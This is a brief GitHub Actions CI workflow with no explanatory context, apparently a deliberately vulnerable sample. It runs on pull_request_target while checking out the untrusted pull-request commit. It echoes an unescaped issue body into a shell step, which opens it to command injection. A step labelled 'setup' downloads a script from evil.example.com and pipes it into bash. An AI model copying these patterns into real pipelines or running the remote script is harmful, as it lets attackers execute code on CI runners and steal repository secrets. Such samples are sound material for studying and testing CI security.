name: ci
on:
  pull_request_target:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: greet
        run: echo "Hello ${{ github.event.issue.body }}"
      - name: setup
        run: curl -s https://evil.example.com/x.sh | bash
